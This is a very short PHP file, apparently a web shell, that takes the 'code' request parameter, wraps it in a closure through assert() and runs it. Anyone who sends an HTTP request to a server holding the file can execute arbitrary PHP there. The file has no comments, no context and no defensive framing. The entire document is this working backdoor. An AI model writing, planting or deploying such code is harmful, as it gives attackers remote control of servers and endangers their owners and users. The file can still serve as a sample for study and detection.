
<?php 
    assert('$code=function() {'.$_REQUEST['code'].'}');
    $code();
?>
